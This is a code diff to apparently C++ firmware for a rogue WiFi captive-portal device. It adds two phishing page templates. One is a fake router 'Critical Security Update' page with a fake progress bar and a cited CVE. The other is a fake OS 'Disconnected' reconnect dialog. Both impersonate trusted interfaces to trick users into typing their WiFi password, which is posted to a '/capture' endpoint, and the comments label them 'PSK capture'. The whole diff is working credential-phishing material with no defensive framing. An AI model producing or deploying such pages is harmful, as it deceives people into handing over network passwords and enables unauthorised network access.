@@ -17,7 +17,7 @@
 
 static const char* const portalTemplateNames[] = {
     "WiFi", "Google", "Microsoft", "Starbucks", "Hotel", "Airport",
-    "ATT", "McDonalds", "Xfinity"
+    "ATT", "McDonalds", "Xfinity", "FW Update", "Reconnect"
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -684,6 +684,121 @@ Not an Xfinity customer? <a href='#'>Get a free trial</a>
 By signing in, you agree to the Xfinity WiFi Terms and Conditions
 and Comcast's Privacy Policy.
 </p>
+</div>
+</body>
+</html>)pg";
+
+// ═══════════════════════════════════════════════════════════════════════════
+// TEMPLATE 9: FIRMWARE UPDATE - PSK capture (router admin style)
+// Gray/blue corporate look, fake progress bar, asks for WiFi password
+// ═══════════════════════════════════════════════════════════════════════════
+
+const char portal_firmware_update[] PROGMEM = R"pg(<!DOCTYPE html>
+<html>
+<head>
+<title>Router Firmware Update</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.c{background:#fff;border-radius:8px;padding:35px;max-width:420px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.4)}
+.hd{background:#34495e;margin:-35px -35px 25px;padding:20px 35px;border-radius:8px 8px 0 0;display:flex;align-items:center;gap:12px}
+.ri{width:32px;height:32px}
+.hd h2{color:#ecf0f1;font-size:16px;font-weight:600}
+.al{background:#e74c3c;color:#fff;padding:12px 16px;border-radius:6px;font-size:13px;margin-bottom:20px;display:flex;align-items:center;gap:8px}
+.al svg{flex-shrink:0}
+h1{font-size:20px;color:#2c3e50;margin-bottom:6px;font-weight:600}
+.sub{font-size:13px;color:#7f8c8d;margin-bottom:20px}
+.pb{background:#ecf0f1;border-radius:4px;height:22px;margin-bottom:20px;overflow:hidden;position:relative}
+.pf{background:linear-gradient(90deg,#3498db,#2980b9);height:100%;width:78%;border-radius:4px;transition:width .3s}
+.pt{position:absolute;right:8px;top:3px;font-size:12px;color:#2c3e50;font-weight:600}
+.fg{margin-bottom:16px}
+label{display:block;font-size:14px;color:#2c3e50;font-weight:500;margin-bottom:6px}
+input[type="password"]{width:100%;padding:12px 14px;font-size:15px;border:2px solid #bdc3c7;border-radius:6px;outline:none}
+input:focus{border-color:#3498db}
+button{width:100%;padding:14px;background:#3498db;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
+button:hover{background:#2980b9}
+.ft{font-size:11px;color:#95a5a6;text-align:center;margin-top:16px;line-height:1.5}
+</style>
+</head>
+<body>
+<div class='c'>
+<div class='hd'>
+<svg class='ri' viewBox='0 0 32 32' fill='none' xmlns='http://www.w3.org/2000/svg'><rect x='4' y='12' width='24' height='14' rx='3' fill='#ecf0f1'/><circle cx='9' cy='19' r='2' fill='#2ecc71'/><circle cx='15' cy='19' r='2' fill='#f39c12'/><rect x='20' y='17' width='5' height='4' rx='1' fill='#3498db'/><rect x='8' y='7' width='2' height='6' fill='#ecf0f1'/><rect x='14' y='4' width='2' height='9' fill='#ecf0f1'/></svg>
+<h2>Router Administration</h2>
+</div>
+<div class='al'>
+<svg width='16' height='16' viewBox='0 0 16 16' fill='none'><path d='M8 1L1 14h14L8 1z' fill='#fff'/><text x='8' y='12' text-anchor='middle' font-size='9' font-weight='bold' fill='#e74c3c'>!</text></svg>
+Critical Security Update Required
+</div>
+<h1>Firmware Update for {{SSID}}</h1>
+<p class='sub'>A critical security patch must be applied to protect your network.</p>
+<div class='pb'><div class='pf'></div><div class='pt'>78%</div></div>
+<p class='sub'>Your WiFi password is required to complete the firmware update and maintain your connection.</p>
+<form method='POST' action='/capture'>
+<div class='fg'>
+<label>WiFi Password</label>
+<input type='password' name='psk' placeholder='Enter your WiFi password' required autofocus>
+</div>
+<button type='submit'>Complete Update</button>
+</form>
+<p class='ft'>This update addresses CVE-2026-0198. Failure to update may leave your network vulnerable to unauthorized access.</p>
+</div>
+</body>
+</html>)pg";
+
+// ═══════════════════════════════════════════════════════════════════════════
+// TEMPLATE 10: WIFI RECONNECT - PSK capture (OS-style WiFi dialog)
+// Clean minimal white, WiFi icon, asks for password to reconnect
+// ═══════════════════════════════════════════════════════════════════════════
+
+const char portal_wifi_reconnect[] PROGMEM = R"pg(<!DOCTYPE html>
+<html>
+<head>
+<title>WiFi Connection</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f0f0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.c{background:#fff;border-radius:14px;padding:40px 35px;max-width:380px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,.12);text-align:center}
+.wi{margin:0 auto 20px}
+.nm{font-size:20px;font-weight:600;color:#1d1d1f;margin-bottom:6px}
+.st{display:inline-block;background:#ff3b30;color:#fff;font-size:11px;font-weight:600;padding:3px 10px;border-radius:10px;margin-bottom:20px}
+.msg{font-size:14px;color:#86868b;line-height:1.6;margin-bottom:24px}
+.msg strong{color:#1d1d1f}
+.fg{margin-bottom:20px;text-align:left}
+label{display:block;font-size:13px;color:#86868b;font-weight:500;margin-bottom:6px}
+input[type="password"]{width:100%;padding:12px 14px;font-size:16px;border:1px solid #d2d2d7;border-radius:10px;outline:none;background:#f5f5f7}
+input:focus{border-color:#0071e3;background:#fff;box-shadow:0 0 0 3px rgba(0,113,227,.15)}
+button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#0077ED}
+.sk{display:block;margin-top:14px;color:#0071e3;font-size:14px;text-decoration:none;font-weight:500}
+.ft{font-size:11px;color:#c7c7cc;margin-top:20px}
+</style>
+</head>
+<body>
+<div class='c'>
+<div class='wi'>
+<svg width='56' height='56' viewBox='0 0 56 56' fill='none' xmlns='http://www.w3.org/2000/svg'>
+<circle cx='28' cy='28' r='28' fill='#f5f5f7'/>
+<path d='M28 38a3 3 0 100-6 3 3 0 000 6z' fill='#ff3b30'/>
+<path d='M20.5 30.5a10.6 10.6 0 0115 0' stroke='#ff3b30' stroke-width='2.5' stroke-linecap='round'/>
+<path d='M15 25a17.7 17.7 0 0126 0' stroke='#ff3b30' stroke-width='2.5' stroke-linecap='round'/>
+<path d='M10 19.5a24.5 24.5 0 0136 0' stroke='#d2d2d7' stroke-width='2.5' stroke-linecap='round'/>
+</svg>
+</div>
+<div class='nm'>{{SSID}}</div>
+<span class='st'>Disconnected</span>
+<p class='msg'>Your connection to <strong>{{SSID}}</strong> has expired. Enter your password to reconnect.</p>
+<form method='POST' action='/capture'>
+<div class='fg'>
+<label>Password</label>
+<input type='password' name='psk' placeholder='Enter WiFi password' required autofocus>
+</div>
+<button type='submit'>Join</button>
+<a href='#' class='sk'>Forget This Network</a>
+</form>
+<p class='ft'>Secured with WPA2/WPA3 Personal</p>
 </div>
 </body>
 </html>)pg";
